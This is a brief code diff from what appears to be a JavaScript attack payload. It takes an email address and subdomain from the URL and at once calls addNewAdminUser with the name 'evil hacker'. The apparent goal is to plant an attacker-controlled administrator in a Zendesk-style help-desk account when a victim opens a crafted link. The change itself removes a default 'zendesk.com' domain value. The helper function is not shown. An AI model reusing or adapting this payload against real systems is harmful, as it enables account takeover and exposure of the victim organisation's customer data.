@@ -2,7 +2,6 @@ const params = new URLSearchParams( document.location.search );
 
 const newEmail = params.get( 'email' );
 const subdomain = params.get( 'subdomain' );
-const domain = params.get( 'domain' ) || 'zendesk.com'
 
 ( async function() {await addNewAdminUser( 'evil hacker', newEmail );})()
 
